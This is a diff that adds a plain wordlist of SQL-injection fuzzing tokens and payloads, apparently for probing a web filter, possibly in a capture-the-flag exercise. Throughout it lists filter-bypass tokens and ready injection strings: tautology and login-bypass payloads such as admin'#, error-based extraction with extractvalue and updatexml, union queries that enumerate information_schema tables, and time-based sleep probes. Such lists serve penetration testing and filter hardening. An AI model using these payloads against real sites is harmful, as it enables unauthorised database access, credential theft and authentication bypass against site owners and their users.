@@ -1,0 +1,137 @@
+and
+or
+union
+select
+from
+where
+order
+by
+group
+having
+limit
+offset
+insert
+update
+delete
+drop
+into
+outfile
+dumpfile
+load_file
+sleep
+benchmark
+extractvalue
+updatexml
+concat
+group_concat
+substr
+substring
+mid
+left
+right
+ascii
+char
+hex
+length
+count
+if
+case
+when
+then
+else
+end
+like
+regexp
+in
+between
+is
+null
+xor
+exists
+dual
+version
+database
+user
+@@version
+information_schema
+table_name
+column_name
+table_schema
+flag
+admin
+password
+users
+'
+"
+#
+--
+-- -
+--+
+/**/
+/*!50000*/
+;
+(
+)
+=
+<
+>
+<=
+>=
+<>
+!=
+||
+&&
+~
+`
+\
+%
+0x7e
++
+%20
+%09
+%0a
+%0b
+%0c
+%0d
+%a0
+%23
+%27
+%3D
+and 1=1
+and(1=1)
+or 1=1
+or(1=1)
+or(1)
+union select 1
+union(select(1))
+and/**/1=1
+or/**/1=1
+1 and 1=1
+1 or 1=1
+1'or(1)#
+1%0aand%0a1=1
+1%09and%091=1
+/*!50000union*/
+/*!50000select*/
+' or 1=1#
+' or 1=1-- -
+" or 1=1#
+') or ('1'='1
+admin'#
+admin' or 1=1#
+1' and 1=1#
+1' and 1=2#
+1' union select 1,2,3#
+1' union select 1,2,3-- -
+1' and extractvalue(1,concat(0x7e,database()))#
+1' and updatexml(1,concat(0x7e,database()),1)#
+1' union select 1,2,group_concat(table_name) from information_schema.tables#
+1' and sleep(3)#
+1' or sleep(3)#
+1';select sleep(3)#
+1 and 1=1
+1 and 1=2
+1 order by 1
+1 order by 3
+1 order by 4
+1 union select 1,2,3
